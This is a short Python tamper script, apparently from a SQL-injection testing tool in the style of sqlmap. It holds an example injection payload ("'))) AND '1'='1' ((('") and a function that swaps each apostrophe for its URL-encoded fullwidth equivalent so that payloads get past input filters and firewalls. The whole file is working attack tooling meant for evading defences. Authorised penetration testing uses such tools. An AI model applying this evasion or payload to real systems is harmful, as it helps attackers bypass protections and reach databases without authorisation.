__example_payload__ = "'))) AND '1'='1' ((('"
__type__ = "hiding an apostrophe by its UTF equivalent"


def tamper(payload, **kwargs):
    payload = str(payload)
    identifier = "'"
    retval = ""
    for char in payload:
        if char == identifier:
            retval += "%EF%BC%87"
        else:
            retval += char
    return retval